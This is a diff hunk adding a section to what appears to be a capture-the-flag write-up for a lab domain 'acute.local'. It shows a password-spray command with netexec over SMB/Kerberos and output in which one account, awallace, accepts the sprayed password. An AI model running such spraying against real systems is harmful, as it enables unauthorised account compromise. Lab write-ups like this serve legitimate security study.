@@ -603,6 +603,25 @@ The administrator accounts hash cracked
 
 # Password spray leads to user compromise
 
+```python
+❯❯❯ nxc smb atsserver.acute.local -u users.txt -p 'Password@123' -k --continue-on-success 
+SMB         atsserver.acute.local 445    atsserver        [*]  x64 (name:atsserver) (domain:acute.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\Administrator:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\Guest:Password@123 KDC_ERR_CLIENT_REVOKED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\krbtgt:Password@123 KDC_ERR_CLIENT_REVOKED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\ATSSERVER$:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\MARVEL-PC01$:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [+] acute.local\awallace:Password@123 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\chall:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\edavies:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\imonks:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\jmorgan:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\lhopkins:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\ACUTE-PC01$:Password@123 KDC_ERR_PREAUTH_FAILED
+```
+
+I have compromised `awallace`
+
 
 
 
